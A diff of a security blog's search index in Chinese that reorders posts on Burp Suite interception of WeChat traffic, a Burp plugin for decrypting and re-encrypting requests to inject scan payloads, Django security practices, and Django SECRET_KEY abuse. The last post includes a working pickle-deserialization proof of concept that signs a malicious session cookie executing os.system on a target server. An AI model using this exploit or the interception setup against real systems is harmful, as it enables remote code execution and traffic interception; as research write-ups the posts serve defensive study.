@@ -104,8 +104,8 @@
         <category>Struts2</category>
       </categories>
       <tags>
-        <tag>S2-048</tag>
         <tag>Struts2</tag>
+        <tag>S2-048</tag>
         <tag>动态分析</tag>
         <tag>CVE-2017-9791</tag>
       </tags>
@@ -133,10 +133,10 @@
         <category>漏洞分析</category>
       </categories>
       <tags>
+        <tag>poc</tag>
         <tag>WordPress</tag>
         <tag>远程代码执行</tag>
         <tag>VirtualHost</tag>
-        <tag>poc</tag>
         <tag>exim4</tag>
         <tag>phpmail</tag>
       </tags>
@@ -150,8 +150,8 @@
       </categories>
       <tags>
         <tag>反序列化</tag>
-        <tag>poc</tag>
         <tag>fastjson</tag>
+        <tag>poc</tag>
         <tag>java</tag>
       </tags>
   </entry>
@@ -163,9 +163,9 @@
         <category>Python</category>
       </categories>
       <tags>
+        <tag>安全编码</tag>
         <tag>Python</tag>
         <tag>LDAP注入</tag>
-        <tag>安全编码</tag>
         <tag>预防注入</tag>
       </tags>
   </entry>
@@ -242,6 +242,19 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[如何让Burpsuite监听微信公众号]]></title>
+    <url>%2F2016%2F02%2F01%2F%E5%A6%82%E4%BD%95%E8%AE%A9Burpsuite%E7%9B%91%E5%90%AC%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%2F</url>
+    <content type="text"><![CDATA[1 目的通过burpsuite代理截获微信公众号的https流量包，做一些重放和自动扫描。这个公众号会利用微信的认证体系，认证完之后就会到他本身的服务器，用户再通过微信内置浏览器的cookie或者其他认证机制交互，当然这些认证数据基本上无法获取，同时这个公众号在微信端也没有转发，在浏览器中打开等普通微信公众号常见功能。 2 模拟器+微信由于模拟器的便捷性，第一个就会被想到，于是在4.0.3的模拟器上装上了最新版的微信，运行就退出。既然最高版本都已经禁止了模拟器，就想着微信的历史版本，装了30，35，40，45，50等版本，都是运行一会就提示升级，并且是不让用，难道我要逆向微信的代码，这个代价有点大，搜搜才知道原来微信已经禁止在模拟器上使用了，后来看到了有人出了解决方案，就是先root，然后装xposed框架，然后在其上装XPrivacy，过程复杂，详情见链接，这种方法我没有接着试下去。 3 真机+微信模拟器已经被禁用，只能拿出自己的手机来试验了。 3.1 wifi 环境由于是台式机，直接使用的随身wifi，如果是笔记本，可以直接将本设置为wifi热点。 3.2 代理设置首先是burpsuite的代理设置，见下图，图中ip则是我的真实机的ip，绑定的端口则可以任意设置，不冲突即可，我这里设置成8080端口。设置完burpsuite则是手机上wifi的代理设置，先连接到wifi热点，长按链接处，选“修改网络”，勾选“显示高级选项”，代理设置那里改成“手动”，就可以填写HTTP代理的主机和端口，在这里我们设置成第二步中burpsuite设置的ip地址和端口地址。 3.3 证书安装这样设置完之后基本上就可以抓包了，如果是https的请求，每次都会提示证书问题，很烦人也影响效率，所以我们要安装burpsuite的证书，由于前面设置好了代理，通过手机浏览器访问http://burp，就能看到有证书下载，下载完之后，通过手机的设置，安全，再到证书安装，安装完证书即可。 这样设置之后，手机上的大部分http和https数据包都能截获了，微信的数据包也能截获了，只是都是加密的，根本不知道是啥，要被测试的公众号呢？每次打开都是白屏，啥提示都没有，burpsuite上无流量显示，通过wireshark抓包，也仅仅是一些到腾讯服务器的tcp流量，难道微信还能自动检测代理存在，自动根据公众号的安全级别来绑定，安全级别高则不发送相应流量，仅仅是猜测。 上述方式行不通，想到了第三种 4 微信windows客户端微信在windows端也提供了相应的版本，相对于手机android版本，功能较弱，当然一些安全策略也有变化。（1）修改windows hosts的配置文件，路径(C:\Windows\System32\drivers\etc\hosts)，具体的配置如下：127.0.0.1 test.com （2）burpsuite代理的设置 按照如上图示设置之后，微信客户端发送到test.com的流量就直接转发给本地127.0.0.1:9080端口，这样burpsuite就能捕获到了，接着burpsuite将该包转发到test.com对应的ip的端口上就完成了一次请求捕获转发的过程。注意事项：support invible proxying 必须开启，否则看不到流量。request handling中redirect to host 必须设置成具体的ip,也就是test.com对应的ip，否则会导致包死循环在本地转发。 在burpsuite中如果设置成test.com会报如下错误1This request to Burp&apos;s web interface used a fully-qualified DNS name in the Host header. The request was blocked to prevent DNS rebinding attacks. You can enable support for fully-qualified DNS names in Burp&apos;s web interface at Proxy / Options / Miscellaneous. 接着按照如上设置之后，将如下选项打勾之后则会报后续错误，解决方法就是直接设置成ip和端口Invalid client request received: Dropped request looping back to same Proxy listener.在此我们就完成了微信流量的监测。 微信windows客户端的好处就是方便测试，另外能够打开在微信 android客户端无法获取链接的问题，目前在1.5.0.33好用，估计过段时间也会被微信封了。]]></content>
+      <categories>
+        <category>Burpsuite</category>
+      </categories>
+      <tags>
+        <tag>Burpsuite</tag>
+        <tag>微信公众号</tag>
+        <tag>监听</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Burpsuite 插件开发之RSA加解密]]></title>
     <url>%2F2016%2F02%2F01%2FBurpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8BRSA%E5%8A%A0%E8%A7%A3%E5%AF%86%2F</url>
     <content type="text"><![CDATA[burpsuit extention 插件 RSA encryption decryption #1，简介 burpsuit是一款非常好用的工具，目前我自己也是重度用户，所以就上手了burpsuit的插件接口开发，这篇文档主要记录了一个解密请求包，插入payload，再加密的插件开发过程。详细的代码见github代码，代码中除了burpsuit的接口实现，还包括各种加解密处理代码。在文档中数据首先是以rsa方式加密des的key得到encryptKey，然后使用des的key加密数据包得到data，再组装成一个JSON格式串，这是加密过程，当然解密过程就是逆向的。插件应用场景主要是用于通过分析apk的实现，或者泄露的密钥，获取其加解密算法，在解密后的数据包中插入payload，发现注入问题等。如下则是加密后的数据包： 1234c=&#123;&quot;data&quot;:&quot;21BhviedgtbwK6rdlK7vzltqxOLxUmU2g5qaO5LWPYTha5fXslmL6jrMkFnJBwpZPZMNl5foxTUHw2Mae++zkWwtzWkKXI9WJ/CJqxO9uORT5I6iUmIG7bBcgnHpmlSNKfFwBvnr9vj3v5ByvW2s2/pL9rSaeD+/8XsX01NA96mC4g5pVBeU5IY9F4tdxH9yobXfN6GzEVhLeiEd30xzMA\u003d\u003d&quot;,&quot;encryptKey&quot;:&quot;bjWZgigAW/ZaAA55v7Yi9AGt2qsP7BfZZISu70qc/xVUVfh5L/Mw/mMbzxkcZ6uXb1vvgXvF7hHYwjsVzvEkRK0rIfIwkcYzn160fvQ/8+F8YBMDLzTEhf8r0KjOLlJV+HgOsS4QG/G9lOU5mnupfrVA9sf54b3OvXHU0TQVG7U\u003d&quot;&#125; 从数据库包能看到大的数据是一个json格式，里面有data，和encryptKey值，encryptKey就是使用RSA加密des 的key得到的，RSA的工作方式和pem文件可通过界面设置，再接着用这个key采用des方式解密data中的内容。操作界面如下： #2，InsertPoint 接口 InsertPoint顾名思义就是注入点，就是payload插入的地方，比如request中的cookie，参数等位置。为了对一些burpsuit不支持的参数格式进行支持就必须实现该接口，可以用在Active Scanner和Intruder中. ##2.1 基础开发知识 最好的方式就是在原有插件的基础上修改，这样能省很多精力，当然如果要一步一步来的话，步骤如下：（1）包含burp的接口文件（2）创建一个包名为burp，在里面创建BurpExtender类，实现IBurpExtender接口，这个BurpExtender类是所有接口的心脏，注意这里涉及到名字都不能改动，burp插件就这么规定的。（3）实现唯一的接口函数123public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) &#123; this. callbacks = callbacks ; &#125; 通过callbacks获取核心基础库能力,像日志，请求，返回值修改等。（4）日志接口 123456789101112131415PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);//输出到插件的outputstdout.println(&quot;Hello output&quot;);// 输出到alerts tabcallbacks.issueAlert(&quot;Hello alerts&quot;);//打印调用栈e.printStackTrace(stderr)``` 有了这些日志接口就能比较好的调试代码了，如果要很好的跟踪请求的，可以在BApp Store中添加&quot;Custom Logger&quot;这个插件，能够记录所有的请求和返回信息。##2.2 getInsertionPoints下面我们就来讲讲如何实现一个`InsertionPoints`接口。第一步继承`IScannerInsertionPointProvider`接口，实现getInsertionPoints()方法，同时通过`callbacks.registerScannerInsertionPointProvider(this)`方法注册成为insertion point provider。下面我们就来看看`getInsertionPoints()`的实现。 @Override public List&lt;IScannerInsertionPoint&gt; getInsertionPoints(IHttpRequestResponse baseRequestResponse) { // 生成insertPoints数组 List&lt;IScannerInsertionPoint&gt; insertionPoints = new ArrayList&lt;IScannerInsertionPoint&gt;(); // 获取请求参数 IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse.getRequest()); List&lt;IParameter&gt; requestParams = requestInfo.getParameters(); for (IParameter parameter : requestParams) { String value = parameter.getValue(); value = helpers.urlDecode(value).trim(); EncryptBean encryptBean = new EncryptBean(); if (parameter.getName().trim().equals(&quot;c&quot;)){//参数中含有c参数表示要加密的内容 encryptBean = JSON.parseObject(value, EncryptBean.class); stdout.println(&quot;private key: &quot; + key.privateKey + &quot; public key &quot; + key.publicKey); try { value = decryptRSAAndDES(key, encryptBean); stdout.println(&quot;after decrypted:Will scan data at parameter &quot; + parameter + &quot; with value decrypted &quot; + value); } catch (Exception e) { e.printStackTrace(stderr); } if (value.isEmpty()) continue; try { String basename = parameter.getName(); //insertionPoints.add(new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)); JSONObject jsonObj = JSON.parseObject(value); String basevalue = &quot;&quot;; for(Map.Entry&lt;String, Object&gt; entry: jsonObj.entrySet()){ basename = entry.getKey(); basevalue = entry.getValue().toString(); //在这里传入总的value值以便在InsertionPoint进行分解，构造加密后的request请求，构造InsertionPoint时传入的value为总的value值 insertionPoints.add(0,new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)); stdout.println(&quot;in for:Will scan AES encrypted data at parameter &quot; + basename + &quot; with value &quot; + value); } } catch(Exception e) { } } } return insertionPoints; } 123这一段代码的大体意思就是通过helper.analyzeRequest方法获取所有请求信息，遍历其中的参数信息，当发现参数名等于&quot;c&quot;时就会调用解密过程，这块的代码需要根据参数格式自定义解析参数过程。调用解密的过程大体就是先解析JSON格式，然后解密，得到解密数据的内容后调用`new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)`实例化一个注入点。一般情况下basename和value是一一对应的，如param1=phoneNum，但是这里我们basename传入param1，value值则是解密后的值如`&#123;&quot;userid&quot;:&quot;51ba27cb-514d-3d86-0000-2f7515a40613&quot;,&quot;task_id&quot;:&quot;1450147269&quot;,&quot;param1&quot;:&quot;000000000000000&quot;,&quot;m&quot;:&quot;https&quot;&#125;`，这么传递是为了方便实例化插入点。接着我们看下InsertionPoint的参数构造。##2.3 InsertionPoint InsertionPoint(BurpExtender newParent, byte[] baseRequest, String basename, String basevalue) { this.parent = newParent; this.baseRequest = baseRequest; this.baseName = basename; //this.baseValue = basevalue; this.value = basevalue; this.baseValue = JSON.parseObject(basevalue).getString(basename); } 1在InsertionPoint的代码中有一个很重要的接口就是buildRequest，这个函数就是用来添加payload。 @Override public byte[] buildRequest(byte[] payload) { String payloadPlain = parent.helpers.bytesToString(payload); String payloadEncrypted = “”; String tmpAESKey = “0123456789abcdef”; parent.stdout.println(“payloadPlain:” + payloadPlain); parent.callbacks.issueAlert(“payloadPlain:” + payloadPlain); try { Map map = JSON.parseObject(this.value, new TypeReference]]></content>
@@ -256,19 +269,6 @@
         <tag>加解密</tag>
         <tag>encryption</tag>
         <tag>decryption</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[如何让Burpsuite监听微信公众号]]></title>
-    <url>%2F2016%2F02%2F01%2F%E5%A6%82%E4%BD%95%E8%AE%A9Burpsuite%E7%9B%91%E5%90%AC%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%2F</url>
-    <content type="text"><![CDATA[1 目的通过burpsuite代理截获微信公众号的https流量包，做一些重放和自动扫描。这个公众号会利用微信的认证体系，认证完之后就会到他本身的服务器，用户再通过微信内置浏览器的cookie或者其他认证机制交互，当然这些认证数据基本上无法获取，同时这个公众号在微信端也没有转发，在浏览器中打开等普通微信公众号常见功能。 2 模拟器+微信由于模拟器的便捷性，第一个就会被想到，于是在4.0.3的模拟器上装上了最新版的微信，运行就退出。既然最高版本都已经禁止了模拟器，就想着微信的历史版本，装了30，35，40，45，50等版本，都是运行一会就提示升级，并且是不让用，难道我要逆向微信的代码，这个代价有点大，搜搜才知道原来微信已经禁止在模拟器上使用了，后来看到了有人出了解决方案，就是先root，然后装xposed框架，然后在其上装XPrivacy，过程复杂，详情见链接，这种方法我没有接着试下去。 3 真机+微信模拟器已经被禁用，只能拿出自己的手机来试验了。 3.1 wifi 环境由于是台式机，直接使用的随身wifi，如果是笔记本，可以直接将本设置为wifi热点。 3.2 代理设置首先是burpsuite的代理设置，见下图，图中ip则是我的真实机的ip，绑定的端口则可以任意设置，不冲突即可，我这里设置成8080端口。设置完burpsuite则是手机上wifi的代理设置，先连接到wifi热点，长按链接处，选“修改网络”，勾选“显示高级选项”，代理设置那里改成“手动”，就可以填写HTTP代理的主机和端口，在这里我们设置成第二步中burpsuite设置的ip地址和端口地址。 3.3 证书安装这样设置完之后基本上就可以抓包了，如果是https的请求，每次都会提示证书问题，很烦人也影响效率，所以我们要安装burpsuite的证书，由于前面设置好了代理，通过手机浏览器访问http://burp，就能看到有证书下载，下载完之后，通过手机的设置，安全，再到证书安装，安装完证书即可。 这样设置之后，手机上的大部分http和https数据包都能截获了，微信的数据包也能截获了，只是都是加密的，根本不知道是啥，要被测试的公众号呢？每次打开都是白屏，啥提示都没有，burpsuite上无流量显示，通过wireshark抓包，也仅仅是一些到腾讯服务器的tcp流量，难道微信还能自动检测代理存在，自动根据公众号的安全级别来绑定，安全级别高则不发送相应流量，仅仅是猜测。 上述方式行不通，想到了第三种 4 微信windows客户端微信在windows端也提供了相应的版本，相对于手机android版本，功能较弱，当然一些安全策略也有变化。（1）修改windows hosts的配置文件，路径(C:\Windows\System32\drivers\etc\hosts)，具体的配置如下：127.0.0.1 test.com （2）burpsuite代理的设置 按照如上图示设置之后，微信客户端发送到test.com的流量就直接转发给本地127.0.0.1:9080端口，这样burpsuite就能捕获到了，接着burpsuite将该包转发到test.com对应的ip的端口上就完成了一次请求捕获转发的过程。注意事项：support invible proxying 必须开启，否则看不到流量。request handling中redirect to host 必须设置成具体的ip,也就是test.com对应的ip，否则会导致包死循环在本地转发。 在burpsuite中如果设置成test.com会报如下错误1This request to Burp&apos;s web interface used a fully-qualified DNS name in the Host header. The request was blocked to prevent DNS rebinding attacks. You can enable support for fully-qualified DNS names in Burp&apos;s web interface at Proxy / Options / Miscellaneous. 接着按照如上设置之后，将如下选项打勾之后则会报后续错误，解决方法就是直接设置成ip和端口Invalid client request received: Dropped request looping back to same Proxy listener.在此我们就完成了微信流量的监测。 微信windows客户端的好处就是方便测试，另外能够打开在微信 android客户端无法获取链接的问题，目前在1.5.0.33好用，估计过段时间也会被微信封了。]]></content>
-      <categories>
-        <category>Burpsuite</category>
-      </categories>
-      <tags>
-        <tag>Burpsuite</tag>
-        <tag>微信公众号</tag>
-        <tag>监听</tag>
       </tags>
   </entry>
   <entry>
@@ -314,18 +314,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Django安全机制]]></title>
-    <url>%2F2015%2F04%2F01%2FDjango%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%2F</url>
-    <content type="text"><![CDATA[#1 xssdjango 已经能防范95%的xss问题，主要原理就是将&lt;,&gt;,&amp;做了转化，但是如下情况还是无能为力（1）属性有动态内容，正确：&lt;img alt=&quot;{{good}}&quot;&gt;,错误：&lt;img alt={{bad}}&gt;,请确保加上双引号。（2）插入到CSS中的数据(style 标签和属性),以及javascript(script标签,事件处理器,onclick等其他属性),在这些标签内请手动escape.（3）还有就是使用了mark_safe跳过了template默认机制或者autoescape关闭了。（4）涉及到dom类型的xss，如document.write等（5）HttpResponse返回动态内容另外注意属性中包含url(href,img src)时验证url协议在白名单内(如http,https,mailto,ftp) #2 csrf1，确保django.middleware.csrf.CsrfViewMiddleware已经开启 在settings.py中，默认是存在的。2，在所有的post表单中中添加了csrf_token，如{% csrf_token %}3，在相应的view函数中，使用了django.template.context_processors.csrf，用法有两种，一个是RequestContext,另外就是手工引入,如下是手工引入:12345678from django.shortcuts import render_to_responsefrom django.template.context_processors import csrfdef my_view(request): c = &#123;&#125; c.update(csrf(request)) # ... view code here return render_to_response("a_template.html", c) @csrf_exempt装饰器是去除csrf防护,另外内置的CSRF保护机制对子域也是无能为力,比如应用在example.com,有一个子域alice.example.com放置用户可控制的内容,这个时候csrf机制是不起作用的.最后注意不要使用get请求去做增删改操作,否则内置的CSRF机制也是无效的. #3 sql注入直接拼接的sql会有注入风险，那如何避免呢？使用django的数据库api，会根据对应的数据库加过滤，但是有两个例外：（1）extra方法中的where参数处,这个参数是故意设计成接受原始SQL；extra的正确用法：Entry.objects.extra(where=[&#39;headline=%s&#39;], params=[&#39;Lennon&#39;])错误用法：Entry.objects.extra(where=[&quot;headline=&#39;Lennon&#39;&quot;])（2）直接使用低层次的数据库api，如execute，raw，可以采用cursor.execute(sql, [user])方式避免，但是部分时候是失效的，如表的位置，列的位置，这种情况下可以使用django.db.connection.ops.quote_name来自己手工加过滤在有params的情况下，django会正确的转义，没有params的情况则不行。正确做法:12345678from django.db import connection def user_contacts(request): user = request.GET['username'] sql = "SELECT * FROM user_contacts WHERE username = %s" cursor = connection.cursor() cursor.execute(sql, [user]) # ... do something with the results #4 点击劫持django已经有X-Frame-Options middleware来处理，强烈建议添加 #5 host头验证使用django.http.HttpRequest.get_host() 可以获取到host，有伪造的话直接报错了，如果直接访问request.META则没有这效果 #6 文件上传django的imageField只会判断上传的文件是否有一个合法的png头，所以基本上无法限制有害文件的上传。（1）另建一个文件服务器（2）限制文件大小，防止dos攻击，如设置apache的LimitRequestBody大小（3）确保文件不可执行（4）传到二级域名上，比如说传到usercontent-example.com上而不是usercontent.example.com上（5）限制文件上传的类型 #7 email头注入用于发送垃圾邮件，hacker发送如下：hello\ncc:spamvictim@example.com 就转变成了To: hardcoded@example.com Subject: hello cc: spamvictim@example.com 可使用djaong.core.mail来发送，他是不允许任意字段中包含newlines #8 目录遍历目录遍历也算一种注入,主要是突破目录限制读取或者写入文件,django中内置的静态内容视图就是一个做转义很好的例子(django.views.static),相关代码如下:1234567891011121314151617import osimport posixpath path = posixpath.normpath(urllib.unquote(path))newpath = ''for part in path.split('/'): if not part: # strip empty path components continue drive, part = os.path.splitdrive(part) head, part = os.path.split(part) if part in (os.curdir, os.pardir): # strip '.' and '..' in path continue newpath = os.path.join(newpath, part).replace('\\', '/')]]></content>
-      <categories>
-        <category>Django</category>
-      </categories>
-      <tags>
-        <tag>Django</tag>
-        <tag>安全属性</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[从Django的SECTET_KEY到代码执行]]></title>
     <url>%2F2015%2F04%2F01%2F%E4%BB%8EDjango%E7%9A%84SECTET_KEY%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
     <content type="text"><![CDATA[1 背景最近审查代码发现某些产品在登录的JS代码中泄露了SECRET_KEY,将该值作为密码加密的盐，这样就暴露了加密salt不太好吧，更重要的是对django的安全造成了极大的威胁。 2 SECRET_KEY作用SECTET_KEY在djanog中使用非常广泛，基本上涉及到安全，加密等的地方都用到了，下面列举一些常见情景：1，json object的签名2，加密函数，如密码重置，表单，评论，csrf的key，session数据 这里面就要重点讲到session的问题，在这里使用不当就会导致代码执行 3 代码执行3.1 settings的session设置django默认存储session到数据库中，但是可能会比较慢，就会使用到缓存，文件，还有cookie等方式，如果采用了cookie机制则有可能代码执行，settings配置如下：SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39; 3.2 django 1.6以下在django1.6以下，session默认是采用pickle执行序列号操作，在1.6及以上版本默认采用json序列化。代码执行只存在于使用pickle序列话的操作中。 3.3 session处理流程可以简单的分为两部分，process_request和process_response,前者负责选择session引擎，初始化cookie数据。见代码12345class SessionMiddleware(object): def process_request(self, request): engine = import_module(settings.SESSION_ENGINE) session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, None) request.session = engine.SessionStore(session_key) process_response则是处理返回给用户的cookie信息，比如修改过期时间等。在将session存入缓存后，可能在某个操作中会用到session信息，这个时候就会通过反序列化操作从缓存中取，如果反序列话引擎是采用pickle机制的话就存在代码执行。反序列化的代码位于django.core.signing.py中，这个模块主要是一些签名，加解密操作，同时也包含序列化和反序列化，默认采用JSON引擎，下面是反序列话loads的代码：123456789101112131415def loads(s, key=None, salt='django.core.signing', serializer=JSONSerializer, max_age=None): """ Reverse of dumps(), raises BadSignature if signature fails """ base64d = smart_str( TimestampSigner(key, salt=salt).unsign(s, max_age=max_age)) decompress = False if base64d[0] == '.': # It's compressed; uncompress it first base64d = base64d[1:] decompress = True data = b64_decode(base64d) if decompress: data = zlib.decompress(data) return serializer().loads(data) 3.4 构造POC12345678910111213141516171819202122import osos.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')from django.conf import settingsfrom django.core import signingfrom django.contrib.sessions.backends import signed_cookiesclass Run(object): def __reduce__(self): return (os.system,('touch /tmp/xxlegend.log',))sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')print sessimport urllib2import cookieliburl = 'http://10.24.35.228:8000/favicon.ico'headers = &#123;'Cookie':'sessionid="%s"' %(sess)&#125;request = urllib2.Request(url,headers = headers)response = urllib2.urlopen(request)print response.read() 通过序列化Run类，实现创建一个文件的操作，在反序列化的时候执行这个操作。执行代码完成可看到在/tmp目录创建xxlegend.log文件，同时web报500错误。 总结利用条件总结起来就是这么几句话，首先泄露了SECRET_KEY,其次session引擎采用了signed_cookies,django版本小于1.6即存在代码执行问题。同样的问题也存在于python的其他web框架中，如flask，bottle。 https://github.com/danghvu/pwp/blob/master/exploit.pyhttps://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.htmlhttps://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/http://www.shysecurity.com/post/Reekeehttp://python.usyiyi.cn/django/topics/http/sessions.htmlhttps://github.com/django/django/blob/stable/1.5.x/django/core/signing.pyhttp://stackoverflow.com/questions/15170637/effects-of-changing-djangos-secret-key/15383766?noredirect=1#comment21743494_15383766]]></content>
@@ -336,6 +324,18 @@
         <tag>Django</tag>
         <tag>SECRET_KEY</tag>
         <tag>代码执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Django安全机制]]></title>
+    <url>%2F2015%2F04%2F01%2FDjango%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%2F</url>
+    <content type="text"><![CDATA[#1 xssdjango 已经能防范95%的xss问题，主要原理就是将&lt;,&gt;,&amp;做了转化，但是如下情况还是无能为力（1）属性有动态内容，正确：&lt;img alt=&quot;{{good}}&quot;&gt;,错误：&lt;img alt={{bad}}&gt;,请确保加上双引号。（2）插入到CSS中的数据(style 标签和属性),以及javascript(script标签,事件处理器,onclick等其他属性),在这些标签内请手动escape.（3）还有就是使用了mark_safe跳过了template默认机制或者autoescape关闭了。（4）涉及到dom类型的xss，如document.write等（5）HttpResponse返回动态内容另外注意属性中包含url(href,img src)时验证url协议在白名单内(如http,https,mailto,ftp) #2 csrf1，确保django.middleware.csrf.CsrfViewMiddleware已经开启 在settings.py中，默认是存在的。2，在所有的post表单中中添加了csrf_token，如{% csrf_token %}3，在相应的view函数中，使用了django.template.context_processors.csrf，用法有两种，一个是RequestContext,另外就是手工引入,如下是手工引入:12345678from django.shortcuts import render_to_responsefrom django.template.context_processors import csrfdef my_view(request): c = &#123;&#125; c.update(csrf(request)) # ... view code here return render_to_response("a_template.html", c) @csrf_exempt装饰器是去除csrf防护,另外内置的CSRF保护机制对子域也是无能为力,比如应用在example.com,有一个子域alice.example.com放置用户可控制的内容,这个时候csrf机制是不起作用的.最后注意不要使用get请求去做增删改操作,否则内置的CSRF机制也是无效的. #3 sql注入直接拼接的sql会有注入风险，那如何避免呢？使用django的数据库api，会根据对应的数据库加过滤，但是有两个例外：（1）extra方法中的where参数处,这个参数是故意设计成接受原始SQL；extra的正确用法：Entry.objects.extra(where=[&#39;headline=%s&#39;], params=[&#39;Lennon&#39;])错误用法：Entry.objects.extra(where=[&quot;headline=&#39;Lennon&#39;&quot;])（2）直接使用低层次的数据库api，如execute，raw，可以采用cursor.execute(sql, [user])方式避免，但是部分时候是失效的，如表的位置，列的位置，这种情况下可以使用django.db.connection.ops.quote_name来自己手工加过滤在有params的情况下，django会正确的转义，没有params的情况则不行。正确做法:12345678from django.db import connection def user_contacts(request): user = request.GET['username'] sql = "SELECT * FROM user_contacts WHERE username = %s" cursor = connection.cursor() cursor.execute(sql, [user]) # ... do something with the results #4 点击劫持django已经有X-Frame-Options middleware来处理，强烈建议添加 #5 host头验证使用django.http.HttpRequest.get_host() 可以获取到host，有伪造的话直接报错了，如果直接访问request.META则没有这效果 #6 文件上传django的imageField只会判断上传的文件是否有一个合法的png头，所以基本上无法限制有害文件的上传。（1）另建一个文件服务器（2）限制文件大小，防止dos攻击，如设置apache的LimitRequestBody大小（3）确保文件不可执行（4）传到二级域名上，比如说传到usercontent-example.com上而不是usercontent.example.com上（5）限制文件上传的类型 #7 email头注入用于发送垃圾邮件，hacker发送如下：hello\ncc:spamvictim@example.com 就转变成了To: hardcoded@example.com Subject: hello cc: spamvictim@example.com 可使用djaong.core.mail来发送，他是不允许任意字段中包含newlines #8 目录遍历目录遍历也算一种注入,主要是突破目录限制读取或者写入文件,django中内置的静态内容视图就是一个做转义很好的例子(django.views.static),相关代码如下:1234567891011121314151617import osimport posixpath path = posixpath.normpath(urllib.unquote(path))newpath = ''for part in path.split('/'): if not part: # strip empty path components continue drive, part = os.path.splitdrive(part) head, part = os.path.split(part) if part in (os.curdir, os.pardir): # strip '.' and '..' in path continue newpath = os.path.join(newpath, part).replace('\\', '/')]]></content>
+      <categories>
+        <category>Django</category>
+      </categories>
+      <tags>
+        <tag>Django</tag>
+        <tag>安全属性</tag>
       </tags>
   </entry>
   <entry>
